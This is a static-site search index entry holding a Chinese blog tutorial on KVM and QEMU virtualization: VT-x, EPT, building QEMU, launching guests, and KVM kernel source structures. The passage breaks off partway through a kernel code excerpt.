<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>KVM_Qemu</title>
    <link href="/2023/06/22/KVM-Qemu/"/>
    <url>/2023/06/22/KVM-Qemu/</url>
    
    <content type="html"><![CDATA[<h1 id="虚拟"><a href="#虚拟" class="headerlink" title="虚拟"></a>虚拟</h1><p>说到虚拟化，经常与底层打交道的同学可能十分熟悉，并且咱们平时办公学习可能会接触到不同的操作系统环境，因此这里我们都会普遍用到一个名叫虚拟机的技术，接下来我们就将重点介绍一下这一方面的具体知识</p><h2 id="0x00-虚拟化整体架构"><a href="#0x00-虚拟化整体架构" class="headerlink" title="0x00 虚拟化整体架构"></a>0x00 虚拟化整体架构</h2><p>首先从架构来说，系统虚拟化的核心思想就是将一台物理机系统虚拟化为多台虚拟机计算机系统，一般来说其中的虚拟环境分为以下三个部分：</p><ol><li>硬件(处理器、内存、IO、网络接口等)</li><li>VMM（Virtual Machine Monitor, 虚拟机监控器，别名Hypervisor）：负责管理所有资源和虚拟环境支持</li><li>虚拟机</li></ol><p>其中如果没有进行系统虚拟化，那么我们的计算机操作系统是直接运行在硬件之上的，在系统虚拟化之后，VMM就成了其中重要的一份子，他取代了传统操作系统的位置，用来调配真实物理硬件，成为了他的管理者，然后向上层软件提供虚拟的硬件平台，而上层的虚拟硬件平台我们又可以通过构建不同的操作系统来达成一套物理硬件环境下同时存在多个操作系统的效果，具体情况如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/9a504fc2d5628535dd6cedead5ef76c6a6ef6368.jpg"></p><p>然后我们引入两个基本指令概念——特权指令和敏感指令</p><ul><li>特权指令：系统中用来操作和管理资源的指令，在现在的操作系统当中大部分只使用到了ring0和ring3，以此来区别内核和用户，该特权指令就是仅系统软件所能使用的指令</li><li>敏感指令：虚拟化世界里面操作特权资源的指令</li></ul><p>所以，他俩可以看作一个容纳的关系，也就是特权指令一定是敏感指令，但敏感指令不一定是特权指令，而我们VMM的实现功能中就有完全控制系统资源，敏感指令应该设置为必须在VMM的监控审查下进行，如果说一个系统上所有敏感指令都是特权指令，则我们称其可虚拟化。VMM运行在系统的最高特权级上，然后客户机操作系统运行在非最高特权级上，此时如果客户机操作系统执行敏感指令，他就会陷入到VMM，VMM再模拟执行引起异常的敏感指令，这种方法被称为“陷入再模拟”</p><p>但如果说我么的敏感指令并不都是特权指令，那也就是说有的敏感指令无法触发异常，这样就会存在虚拟化漏洞，这也就被定义为不可虚拟化。<br>接下来我们来介绍VMM的几个重要功能</p><h2 id="0x01-处理器虚拟化"><a href="#0x01-处理器虚拟化" class="headerlink" title="0x01 处理器虚拟化"></a>0x01 处理器虚拟化</h2><p>我们在x86下实现虚拟化，需要在客户机操作系统下加入虚拟化层,该虚拟化层必须处于ring0级别，而客户机操作系统必须是ring0以上的级别。而如果我们客户机中的特权指令若不是运行在ring0级别会导致虚拟化漏洞，而基于软件虚拟化技术弥补这一漏洞的手段有以下两种：</p><ol><li>全虚拟化：采用二进制代码动态翻译技术（Dynamic Binary Translation），也就是碰到客户机操作系统无法触发异常的敏感指令，会进行一个转换过程，然后由宿主机进行执行,此时客户机不知道自己是虚拟的，以为自己就是正常运行再物理环境下；</li><li>半虚拟化：通过修改客户机操作系统，将所有的敏感指令替换为对底层虚拟化平台的超级调用。此时客户机知道自己处于虚拟环境。</li></ol><p>几种架构对比如下，由左至右分别是未虚拟化、全虚拟化、半虚拟化：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/4b90f603738da9778c38bee0f551f8198718e3e2.jpg"></p><h3 id="1-vCPU"><a href="#1-vCPU" class="headerlink" title="1.vCPU"></a>1.vCPU</h3><p>硬件虚拟化采用vCPU(virtual CPU)描述符来描述虚拟CPU，实际上就是一个结构体。在VMM创建客户机的时候，首先要为客户机创建一个vCPU，然后通过VMM进行调度，类似于进程调度。</p><h3 id="2-Intel-VT-x"><a href="#2-Intel-VT-x" class="headerlink" title="2.Intel VT-x"></a>2.Intel VT-x</h3><p>虽然我们可以通过处理器软件虚拟化来实现VMM，但是增加了系统的复杂性和开销，因此如果我们在CPU中加入对虚拟化的支持，那么就可以使得系统软件更高效的实现虚拟化，其中该类硬件辅助虚拟化技术就有标题的Intel VT-x和即将讲到的AMD SVM.这俩分别是Intel和AMD两大CPU公司提供的技术。<br>我们上文讲到一般我们指令的虚拟化是采用<code>陷入再模拟</code>的方式实现的，而IA32架构有19条敏感指令不能通过该方法处理，因此导致了虚拟化漏洞。因此Intel VT中VT-x技术为处理器增加了一套名为<code>Virtual Machine Extensions,VMX</code>，也就是虚拟机扩展的指令集，其中包含十条左右用来支持虚拟化相关的操作，且其中也引入了两种操作模式，统称为VMX操作模式：</p><ol><li>根操作模式（VMX Root Operation）：VMM运行所处模式</li><li>非根操作模式（VMX Non-Root Operation）：客户机运行所处模式</li></ol><p>在非根模式下，所有敏感指令（包括那19条不能被虚拟化的敏感指令）的行为都被重新定义，使得他们可以不通过虚拟化就直接运行或通过<code>陷入再模拟</code>的方式来处理；再根模式下，他所有指令就如传统IA32一样没有改变。<br>这两种模式均具有0和3特权级，因此描述程序运行在某个特权级应该具体指明处于何种模式。</p><p>而该VMX模式在默认情况下是关闭的，当VMM需要使用这个功能的时候，就可以使用VT-x提供的指令来打开此操作模式，大致过程如下：</p><ol><li>VMM执行VMXON进入VMX操作模式，此时CPU处于VMX根操作模式，VMM软件开始执行</li><li>VMM执行VMLAUNCH或VMRESUME产生VM-Entry,客户机软件开始执行，此时CPU从根模式转换成非根模式</li><li>当客户机执行特权指令，或者客户机发送中断或异常，VM-Exit被触发然后陷入VMM，CPU自动从非根模式切换到根模式，VMM根据其原因做相应处理，然后转至步骤2继续执行</li><li>如果VMM决定退出，则执行VMXOFF关闭VMX操作模式</li></ol><p><img src="http://imgsrc.baidu.com/forum/pic/item/34fae6cd7b899e519d9501df07a7d933c9950de5.jpg"></p><p>此外还有VMCS来支持处理器虚拟化，他是一个保存在内存当中的数据结构，一般包含如下几个重要字段：</p><ol><li>vCPU标识信息：标识vCPU的一些属性</li><li>虚拟寄存器信息：虚拟的寄存器资源</li><li>vCPU状态信息：标识vCPU当前状态</li><li>额外寄存器&#x2F;部件信息：存储VMCS中没有保存的一些寄存器或CPU部件</li><li>其他信息：存储VMM进行优化或者额外信息的字段</li></ol><p>每一个VMCS对应一个虚拟CPU需要的相关信息，CPU在发生VM-Exit和VM-Entry时都会自动查询和更新VMCS</p><p>总结以下，整个VT-x架构可以用下图表示</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/0df3d7ca7bcb0a460248b0f22e63f6246a60af97.jpg"></p><h3 id="3-AMD-SVM"><a href="#3-AMD-SVM" class="headerlink" title="3.AMD SVM"></a>3.AMD SVM</h3><p>Intel说完了，他的老对手AMD当然也得讲一下，在其中的SVM当中，有很多同Intel VT-x类似的地方，例如他也有根模式和非根模式等，只不过技术上略有不同，这里涉猎较少就掠过了</p><h2 id="0x02-内存虚拟化"><a href="#0x02-内存虚拟化" class="headerlink" title="0x02 内存虚拟化"></a>0x02 内存虚拟化</h2><p>VMM提供一个虚拟的物理地址空间给客户机操作系统，因此客户机会认为其中的物理地址是连续的，但其实他在真实的物理地址上是随意分布的，因此客户机的物理地址不能直接被发送到系统容总线上去，VMM需要先将客户机物理地址转换为实际的物理地址再交给处理器执行，因此需要解决下面两个问题：</p><ol><li>维护宿主机物理地址和客户机物理地址之间的映射关系</li><li>截获宿主机对客户机物理地址的访问，并根据所记录的映射关系转换成宿主机物理地址</li></ol><p>第一个问题中，有两轮地址转换，分别是客户机虚拟地址（GVA，Guest Virtual Address）-&gt;客户机物理地址（GPA，Guest Virtual Address）-&gt;宿主机虚拟地址（HPA，Host Physical Address），其中第一轮转换是由客户机操作系统通过VMCS（AMD SVM 中的VMCB）中客户机状态域的CR3,也就是pdbr指向的页表来进行转换，也就是客户机自己的一个页目录表，然后第二轮转换则是由VMM决定。</p><p>而传统IA32架构只支持以此地址转换，这和虚拟化需要两次转换相矛盾，因此存在一种解决方式，就是直接建立GVA到HPA的映射，其中存放映射关系的表叫做<code>影子页表</code>，也就是<code>Shadow Page Table</code>，但是缺点也十分明显，即映射机制十分复杂。</p><p>因此为了优化这一点，Intel公司提供EPT技术，AMD公司提供AMD NPT技术，直接在硬件上支持GVA-&gt;GPA-&gt;HPA的两次地址转换。</p><p>而第二个问题的解决方法是让客户机对宿主机物理地址的访问每一次都触发异常，由VMM查询地址转换表再模仿其访问，但是性能较差</p><h3 id="1-Intel-EPT"><a href="#1-Intel-EPT" class="headerlink" title="1.Intel EPT"></a>1.Intel EPT</h3><p>EPT页表存在于VMM内核空间，由VMM来维护，其EPT页表基地址由VMCS的字段来指定，包含了EPT页表的宿主机系统物理地址，通过该页表能够将客户机物理地址最直接翻译成宿主机物理地址，我们这里通过一个流程图来了解此时地址转换的一个过程</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/0824ab18972bd407b3e8f0363e899e510eb309c9.jpg"></p><p>假设为二级页表。此时地址翻译过程如下：</p><ol><li>首先通过CR3找到客户机的页表，此时指向的是客户机物理地址GPA，然后CPU通过EPT TLB来进行一个缓存搜索，找到则直接返回HPA，否则CPU再通过EPT MMU，从EPT页表中找到对应值返回HPA</li><li>此时通过GVA在页目录中的对应表项来获取L1页表项的GPA，然后重复上述操作获取HPA，最后找到我们想要访问的GPA，然后再次进行对应转换即可得到最终的HPA</li></ol><p>从上面过程中我们可以得知，CPU需要进行大量的内存访问才可以实现最终的地址转换，因此一般我们将EPT TLB设置大一点来尽量减少访问次数。<br>可能有同学觉得这个根影子页表差不多，但是需要注意一点的是，影子页表是我们基于软件层面实现的，因此十分缓慢且复杂，而这个EPT则是直接由硬件支持，速度快且实现简单。</p><h2 id="0x03-I-x2F-O虚拟化"><a href="#0x03-I-x2F-O虚拟化" class="headerlink" title="0x03 I&#x2F;O虚拟化"></a>0x03 I&#x2F;O虚拟化</h2><h2 id="0x04-构建KVM环境"><a href="#0x04-构建KVM环境" class="headerlink" title="0x04 构建KVM环境"></a>0x04 构建KVM环境</h2><p><img src="http://imgsrc.baidu.com/forum/pic/item/2f738bd4b31c87015b16532a627f9e2f0608ff5f.jpg"></p><p>KVM是一种用于Linux内核中的虚拟化基础设置，可以将Linux内核转化为一个Hypervisor(VMM),其具体实现方式就是在Linux内核上通过加载一个新的模块使得Linux内核变成一个Hypervisor,在主流Linux内核的v2.6.20后，KVM已经成为了主流Linux内核的一个模块嵌入其中，他不仅支持Linux客户操作系统的虚拟化，同时也支持其他硬件对虚拟化敏感的Windows系统的虚拟化</p><h3 id="1-KVM运行过程概述"><a href="#1-KVM运行过程概述" class="headerlink" title="1.KVM运行过程概述"></a>1.KVM运行过程概述</h3><p>首先我们知道，KVM模块让Linux主机成为了一个虚拟机监视器，并且在原有的Linux两种执行模式-用户模式和内核模式，增加了一种新的模式，那就是客户模式，他执行非IO的客户代码，虚拟机运行在这个模式之下。</p><p>在KVM的模型当中，每一个虚拟机都是一个由Linux调度程序管理的标准进程，都可以使用Linux进程管理命令进行管理，这样就使得我们Linux内核也成为了一个Hypervisor了。<br>当KVM内核模块被内核加载的时候，KVM模块会首先初始化内部的数据结构，然后检测系统当前的CPU，打开CR4控制器的虚拟化模式开关，通过执行VMXON指令将宿主操作系统（包括KVM模块本身）置于虚拟化模式中的根模式，然后创建特殊设备文件<code>/dev/kvm</code>并且等待来自用户空间的命令，接下来就是用户程序（qemu）和KVM模块的相互配合，主要是通过ioctl调用来进行管理。</p><h3 id="2-KVM与QEMU的关系"><a href="#2-KVM与QEMU的关系" class="headerlink" title="2.KVM与QEMU的关系"></a>2.KVM与QEMU的关系</h3><p>事实上，qemu自身就有一套完整的虚拟机实现，包括处理器虚拟化、内存虚拟化以及等等外设的模拟，但是他是纯软件实现，因此效率极低，此时有人就提议将KVM和QEMU结合使用，于是他们就修改了qemu的部分代码，使得qemu可以控制KVM内核模块。KVM和QEMU相互配合，QEMU可以通过KVM达到硬件虚拟化的速度，而KVM通过QEMU来模拟设备。他俩的关系简单来讲，就是KVM只模拟CPU和内存，因此一个客户机操作系统可以在宿主机上面运行，但是你看不到他，无法通过外设与他沟通，而我们就可以通过修改QEMU代码，把qemu中模拟CPU，内存的部分换成KVM，而网卡、显示器等保留，因此QEMU+KVM就构成了一个完整的虚拟化平台</p><h3 id="3-宿主机Linux环境"><a href="#3-宿主机Linux环境" class="headerlink" title="3.宿主机Linux环境"></a>3.宿主机Linux环境</h3><p>我们本次的宿主环境是Ubuntu 20.04，我们可以通过使用命令<code>cat /etc/issue</code>查看，如下：</p><pre><code class="hljs">dawn@dawn-virtual-machine:~$ cat /etc/issueUbuntu 20.04.7 LTS \n \l</code></pre><p>这里有个点需要注意，如果你的宿主机是安装在vmware workstation上面（我就是这样，虚拟中的虚拟机中的虚拟机），需要勾选这里才可以,注意我这里灰着是因为虚拟机还开着，他需要关闭虚拟机的时候才可以设置</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/7aec54e736d12f2e9d2e82ab0ac2d562843568d5.jpg"></p><p>然后我们可以查看CPU是否支持KVM，也就是是否支持虚拟化，可以使用如下命令<code>grep -E -o &#39;vmx|svm&#39;/proc/cpuinfo</code></p><pre><code class="hljs">dawn@dawn-virtual-machine:~$ grep -E &#39;(svm|vmx)&#39; /proc/cpuinfoflags: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon rep_good nopl xtopology tsc_reliable nonstop_tsc cpuid pni pclmulqdq vmx ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch cpuid_fault invpcid_single ssbd ibrs ibpb stibp ibrs_enhanced tpr_shadow vnmi ept vpid fsgsbase tsc_adjust bmi1 avx2 smep bmi2 erms invpcid avx512f avx512dq rdseed adx smap avx512ifma clflushopt clwb avx512cd sha_ni avx512bw avx512vl xsaveopt xsavec xgetbv1 xsaves arat avx512vbmi umip pku ospke avx512_vbmi2 gfni vaes vpclmulqdq avx512_vnni avx512_bitalg avx512_vpopcntdq rdpid md_clear flush_l1d arch_capabilitiesflags: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon rep_good nopl xtopology tsc_reliable nonstop_tsc cpuid pni pclmulqdq vmx ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch cpuid_fault invpcid_single ssbd ibrs ibpb stibp ibrs_enhanced tpr_shadow vnmi ept vpid fsgsbase tsc_adjust bmi1 avx2 smep bmi2 erms invpcid avx512f avx512dq rdseed adx smap avx512ifma clflushopt clwb avx512cd sha_ni avx512bw avx512vl xsaveopt xsavec xgetbv1 xsaves arat avx512vbmi umip pku ospke avx512_vbmi2 gfni vaes vpclmulqdq avx512_vnni avx512_bitalg avx512_vpopcntdq rdpid md_clear flush_l1d arch_capabilities</code></pre><p>然后里面可以发现确实存在vmx，说明我们的处理器是支持虚拟化了已经。</p><p>我们此时可以查看一下我们的内核版本，如下：</p><pre><code class="hljs">dawn@dawn-virtual-machine:~$ uname -r4.15.0-142-generic</code></pre><p>在linux内核2.6.20版本后KVM已经正式加入到内核发行代码当中，因此咱们没必要下载KVM源码进行编译，我们再次来确认模块当中是否含有KVM,如下：</p><pre><code class="hljs">dawn@dawn-virtual-machine:~$ lsmod|grep kvmkvm_intel             217088  0kvm                   614400  1 kvm_intelirqbypass              16384  1 kvm</code></pre><h3 id="4-qemu安装"><a href="#4-qemu安装" class="headerlink" title="4.qemu安装"></a>4.qemu安装</h3><p><img src="http://imgsrc.baidu.com/forum/pic/item/18d8bc3eb13533fad316bfe5edd3fd1f40345b5c.jpg"></p><p>首先咱们安装依赖环境，如下（注意l和1的区别）：</p><pre><code class="hljs">sudo apt-get install gcc libsdl1.2-dev zlib1g-dev libasound2-dev linux-kernel-headers pkg-config libgnutls-dev libpci-dev</code></pre><p>依赖装完，我们来下载qemu的源码，直接clone下来</p><pre><code class="hljs">dawn@dawn-virtual-machine:~/qemu/qemu-2.2.1$ git clone https://gitlab.com/qemu-project/qemu.gitCloning into &#39;qemu&#39;...remote: Enumerating objects: 670896, done.remote: Counting objects: 100% (62/62), done.remote: Compressing objects: 100% (61/61), done.remote: Total 670896 (delta 23), reused 0 (delta 0), pack-reused 670834Receiving objects: 100% (670896/670896), 261.02 MiB | 10.61 MiB/s, done.Resolving deltas: 100% (558496/558496), done.Checking connectivity... done.</code></pre><p>然后我们cd到qemu目录下，执行</p><pre><code class="hljs">./configure </code></pre><p>然后安装即可：<code>make</code> <code>make install</code>，此处可以采取多线程编译，如果说嫌自己编译太麻烦，可以直接使用<br> <code>sudo apt-get install qemu-system qemu-user</code>来进行下载</p><h3 id="5-客户机安装步骤"><a href="#5-客户机安装步骤" class="headerlink" title="5.客户机安装步骤"></a>5.客户机安装步骤</h3><p>首先创建一个镜像文件来做我们的虚拟硬盘，有两种方式：</p><ol><li>dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;ubuntu.img bs&#x3D;1M count&#x3D;8192,其中&#x2F;dev&#x2F;zero这个设备会产生无限的0，也就是说这个操作使得我们生成了一个大小为8192字节的虚拟硬盘，且内容全0；</li><li>qemu-img create -f qcow2 win7.img 10G,其中qcow2是文件格式</li></ol><p>然后我们需要准备安装系统的ISO文件，这里我们直接到Ubuntu官网下载一个14.04的历史镜像作为我们的客户机<br>,然后我们直接开启虚拟机，注意这里的参数搭配</p><pre><code class="hljs">dawn@dawn-virtual-machine:~/KVMlearning$ sudo qemu-system-x86_64 -enable-kvm -m 1024 -smp 4 -boot order=cd -hda ./ubuntu.img -cdrom ./ubuntu-14.04.6-desktop-amd64.iso</code></pre><p>我们来讲解下面命令的几个基本参数</p><ul><li><code>-enable-kvm</code>:表示使用kvm内核开启虚拟机加速，而不是qemu自己的内核。</li><li><code>-m 1024</code>：表示给客户机分配1024MB内存</li><li><code>-smp 4</code>：表示分配给客户机4个CPU</li><li><code>-boot order=cd</code>:表示指定系统的启动顺序为光驱<code>CD-ROM</code>而不是硬盘<code>hard Disk</code></li><li><code>-hda</code>：我们刚刚创建的镜像文件用来作为客户机的硬盘</li><li><code>-cdrom</code>：表示分配给客户机的光驱，并在光驱中使用我们上面准备的ISO文件作为系统的启动文件</li></ul><p><img src="http://imgsrc.baidu.com/forum/pic/item/4034970a304e251f05f33333e286c9177e3e53f1.jpg"></p><p><img src="http://imgsrc.baidu.com/forum/pic/item/10dfa9ec8a136327668415f8d48fa0ec09fac794.jpg"></p><p>可以看到，由于我是在vmware workstation上面运行的我的ubuntu 20.04，此时再在里面使用qemu开启另一个14.04虚拟机，<br>然后我们按照步骤进行安装即可<br><img src="http://imgsrc.baidu.com/forum/pic/item/ca1349540923dd542d2470a39409b3de9d8248a2.jpg"></p><p>上面的启动参数类似于咱们重装系统从usb中启动，当我们安装成功之后就不需要这么多参数了，我们只需要从我们建立的虚拟硬盘启动即可</p><pre><code class="hljs">qemu-system-x86_64 -enable-kvm -m 1024 -smp 4 -hda ubuntu.img</code></pre><h2 id="0x05-KVM核心模块解析"><a href="#0x05-KVM核心模块解析" class="headerlink" title="0x05 KVM核心模块解析"></a>0x05 KVM核心模块解析</h2><p>首先讲解qemu的一些标准选项</p><ul><li><code>-name name</code>:设定客户机名称</li><li><code>-M machine</code>:设定要模拟的主机类型，例如Ubuntu 14.04PC等</li><li><code>-m megs</code>:设定客户机的RAM大小</li><li><code>-cpu model</code>:设定CPU模型，例如qemu32、qemu64等</li><li><code>-smp</code>:设定模拟的SMP架构中CPU的个数</li><li><code>-numa opts</code>:指定模拟多节点的numa设备</li><li><code>-fda file</code>:指定file作为软盘镜像</li><li><code>-hda/b/c/d file</code>:使用指定file作为硬盘镜像</li><li><code>-cdrom file</code>:使用指定file作为CD-ROM镜像，需要注意-cdrom和-hdc不可同时使用</li></ul><h3 id="1-内核模块组成"><a href="#1-内核模块组成" class="headerlink" title="1.内核模块组成"></a>1.内核模块组成</h3><p>Linux内核2.6.20版本后就将KVM收入到内核当中，主要位于<code>/virt</code>,<code>/arch/x86/kvm</code>这两个目录当中，要想分析<code>Linux Kernel</code>，<code>Makefile</code>和<code>Kconfig</code>是理解源代码的最好的地图。Kconfig中包含主要的有三个选项：<br> <code>KVM</code>，<code>KVM-INTEL</code>,<code>KVM-AMD</code>,其中<code>KVM</code>选项是KVM的开关，后面两个就是对应不同厂商。下面我们来看看makefile</p><pre><code class="hljs"># SPDX-License-Identifier: GPL-2.0ccflags-y += -I $(srctree)/arch/x86/kvmccflags-$(CONFIG_KVM_WERROR) += -Werrorifeq ($(CONFIG_FRAME_POINTER),y)OBJECT_FILES_NON_STANDARD_vmenter.o := yendifKVM := ../../../virt/kvkvm-y+= $(KVM)/kvm_main.o $(KVM)/coalesced_mmio.o \                $(KVM)/eventfd.o $(KVM)/irqchip.o $(KVM)/vfio.o \                $(KVM)/dirty_ring.o $(KVM)/binary_stats.okvm-$(CONFIG_KVM_ASYNC_PF)+= $(KVM)/async_pf.okvm-y+= x86.o emulate.o i8259.o irq.o lapic.o \               i8254.o ioapic.o irq_comm.o cpuid.o pmu.o mtrr.o \               hyperv.o debugfs.o mmu/mmu.o mmu/page_track.o \               mmu/spte.oifdef CONFIG_HYPERVkvm-y+= kvm_onhyperv.oendifkvm-$(CONFIG_X86_64) += mmu/tdp_iter.o mmu/tdp_mmu.okvm-$(CONFIG_KVM_XEN)+= xen.okvm-intel-y+= vmx/vmx.o vmx/vmenter.o vmx/pmu_intel.o vmx/vmcs12.o \               vmx/evmcs.o vmx/nested.o vmx/posted_intr.okvm-intel-$(CONFIG_X86_SGX_KVM)+= vmx/sgx.okvm-amd-y+= svm/svm.o svm/vmenter.o svm/pmu.o svm/nested.o svm/avic.o svm/sev.oifdef CONFIG_HYPERVkvm-amd-y+= svm/svm_onhyperv.oendifobj-$(CONFIG_KVM)+= kvm.oobj-$(CONFIG_KVM_INTEL)+= kvm-intel.oobj-$(CONFIG_KVM_AMD)+= kvm-amd.o</code></pre><p>我们可以看到主要的就是最后三行是主要的点，其中第一项即为KVM核心模块，后面两项就是厂商独立模块了。</p><h3 id="2-KVM内核源码结构"><a href="#2-KVM内核源码结构" class="headerlink" title="2.KVM内核源码结构"></a>2.KVM内核源码结构</h3><p>先简单介绍下KVM的基本工作原理：<br>用户模式的qemu通过接口<code>libkvm</code>通过<code>ioctl</code>系统调用进入内核模式,<code>KVM Driver</code>为虚拟机创建虚拟内存和虚拟CPU后执行<code>VMLAUNCH</code>指令进入客户模式，装在客户机且执行。如果客户机发生外部中断或者影子页表却也之类的情况，那就暂停客户机的执行，退出客户模式进行一些必要的处理。处理完毕后重新进入客户模式，执行客户代码。如果发生I&#x2F;O事件或者信号队列中有信号到达，就会进入用户模式处理。KVM采用全虚拟化技术，客户机不用修改就可以运行。如下图：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/7af40ad162d9f2d3a5a2fe24ecec8a136227cc4f.jpg"></p><p>而KVM内核模块的实现当中主要包括三大部分：虚拟机的调度执行，内存管理，设备管理。</p><h4 id="虚拟机调度执行"><a href="#虚拟机调度执行" class="headerlink" title="虚拟机调度执行"></a>虚拟机调度执行</h4><p>直接上图<br><img src="http://imgsrc.baidu.com/forum/pic/item/0e2442a7d933c89564055db0941373f083020086.jpg"></p><h4 id="KVM中的内存管理"><a href="#KVM中的内存管理" class="headerlink" title="KVM中的内存管理"></a>KVM中的内存管理</h4><p>KVM使用影子页表实现客户机物理地址到主机物理地址的转换。在KVM中存在一个哈希列表和哈希函数，以客户机页表项中的虚拟页号和该页表所在页表的级别作为键值，如果不为空则说明影子页表已经形成，为空则需要新生成一张表，KVM将获取指向该影子页表的主机物理页号填充到相应的影子页表项的内容中。如果客户机os当中出现进程切换，我们的影子页表就需要全部删除重建。</p><h4 id="KVM中的设备管理"><a href="#KVM中的设备管理" class="headerlink" title="KVM中的设备管理"></a>KVM中的设备管理</h4><p>KVM通过移植QEMU的设备模型进行设备的管理和访问。在操作系统当中，软件使用可编程I&#x2F;O(Programmable Input&#x2F;Output,PIO)和内存映射(Memory Mapping Input&#x2F;Output,MMIO)与硬件进行交互。硬件可以发出中断请求给可编程控制器，然后通过控制器来经过INTR线来向CPU发出中断请求。所以虚拟机需要捕获并且模拟PIO和MMIO的请求。</p><ul><li>PIO的捕获：硬件直接提供。当VM发出PIO指令的时候，会发出<code>VM Exit</code>然后硬件会将其原因及对应的指令写入VMCS控制结构当中，这样KVM就会模拟PIO的指令</li><li>MMIO的捕获：对MMIO页的访问导致缺页异常，被KVM捕获，然后通过x86模拟器模拟执行MMIO指令。其中KVM中的I&#x2F;O虚拟化都是通过QEMU实现的，而所有的PIO和MMIO指令都是转发到QEMU的</li></ul><h3 id="3-KVM-API"><a href="#3-KVM-API" class="headerlink" title="3.KVM API"></a>3.KVM API</h3><p>KVM API实际上就是一组<code>ioctl</code>指令集合，主要功能是为了控制虚拟机的整个生命周期。其所提供的用户空间API从功能上划分，大致可以分为三种类型</p><table><thead><tr><th>API类型</th><th>功能说明</th></tr></thead><tbody><tr><td>System指令</td><td>针对虚拟机全局性参数进行查询和设置以及用于虚拟机创建等操作控制</td></tr><tr><td>VM指令</td><td>影响具体VM虚拟机的属性进行查询和设置，比如内存大小设置、创建VCPU等。VM指令不是进程安全的</td></tr><tr><td>vCPU指令</td><td>针对具体vCPU进行参数设置，比如MRU寄存器读写、中断控制等</td></tr></tbody></table><p>这些API指令都是围绕<code>/dev/kvm</code>来进行的，他是一个标准的字符型设备</p><pre><code class="hljs">dawn@dawn-virtual-machine:~/KVMlearning$ ls -l /dev/kvmcrw-rw----+ 1 root kvm 10, 232 Apr 30 07:02 /dev/kvm</code></pre><p>一般来说，用户态程序通过对KVM API的操作是由打开kvm设备文件开始的，通过调用open来获取该文件的一个句柄指针也就是文件描述符，然后通过ioctl系统调用加上特定的指令字来执行我们的操作。</p><h4 id="KVM-API中的结构体们"><a href="#KVM-API中的结构体们" class="headerlink" title="KVM API中的结构体们"></a>KVM API中的结构体们</h4><p>首先那就当然是我们的<code>file_operations</code>，他在<code>/linux/fs.h</code>当中定义，用来存储驱动内核模块提供的对设备进行各种操作的函数指针。该结构体的每个域都对应着驱动内核模块用来处理某个被请求事务的函数地址，他定义在<code>/include/linux/fs.h</code>当中：</p><pre><code class="hljs">struct file_operations &#123;    struct module *owner;    loff_t (*llseek) (struct file *, loff_t, int);    ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);    ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);    ssize_t (*read_iter) (struct kiocb *, struct iov_iter *);    ssize_t (*write_iter) (struct kiocb *, struct iov_iter *);    int (*iopoll)(struct kiocb *kiocb, bool spin);    int (*iterate) (struct file *, struct dir_context *);    int (*iterate_shared) (struct file *, struct dir_context *);    __poll_t (*poll) (struct file *, struct poll_table_struct *);    long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long);    long (*compat_ioctl) (struct file *, unsigned int, unsigned long);    int (*mmap) (struct file *, struct vm_area_struct *);    unsigned long mmap_supported_flags;    int (*open) (struct inode *, struct file *);    int (*flush) (struct file *, fl_owner_t id);    int (*release) (struct inode *, struct file *);    int (*fsync) (struct file *, loff_t, loff_t, int datasync);    int (*fasync) (int, struct file *, int);    int (*lock) (struct file *, int, struct file_lock *);    ssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int);    unsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long);    int (*check_flags)(int);    int (*flock) (struct file *, int, struct file_lock *);    ssize_t (*splice_write)(struct pipe_inode_info *, struct file *, loff_t *, size_t, unsigned int);    ssize_t (*splice_read)(struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int);    int (*setlease)(struct file *, long, struct file_lock **, void **);    long (*fallocate)(struct file *file, int mode, loff_t offset,              loff_t len);    void (*show_fdinfo)(struct seq_file *m, struct file *f);#ifndef CONFIG_MMU    unsigned (*mmap_capabilities)(struct file *);#endif    ssize_t (*copy_file_range)(struct file *, loff_t, struct file *,            loff_t, size_t, unsigned int);    loff_t (*remap_file_range)(struct file *file_in, loff_t pos_in,                   struct file *file_out, loff_t pos_out,                   loff_t len, unsigned int remap_flags);    int (*fadvise)(struct file *, loff_t, loff_t, int);&#125; __randomize_layout;</code></pre><p>我们可以通过源码看出来他的一些成员就是咱们的系统调用的一些指针。<br>而KVM提供的接口当中，总的接口是<code>/dev/kvm</code>设备文件，该接口提供了KVM最基本的功能，如查询API版本、创建虚拟机等，对应的设备文件fop结构为<code>kvm_device_fops</code>,他定义在<code>/virt/kvm/kvm_main.c</code>当中：</p><pre><code class="hljs">static const struct file_operations kvm_device_fops = &#123;    .unlocked_ioctl = kvm_device_ioctl,    .release = kvm_device_release,    KVM_COMPAT(kvm_device_ioctl),    .mmap = kvm_device_mmap,&#125;;</code></pre><p>他是一个标准的<code>file_operations</code>结构体，但是中包含了ioctl函数，其他诸如<code>read</code>、<code>open</code>等常用系统调用均默认实现。所以我们就只能在用户态通过ioctl函数进行操作。</p><p>在KVM创建虚拟机的过程当中，我们首先通过上述接口创建一个VM，调用函数<code>kvm_dev_ioctl_creat_vm</code>,它实现在<code>/virt/kvm/kvm_main.c</code>当中，代码如下：</p><pre><code class="hljs">static int kvm_dev_ioctl_create_vm(unsigned long type)&#123;    int r;    struct kvm *kvm;    struct file *file;    kvm = kvm_create_vm(type);      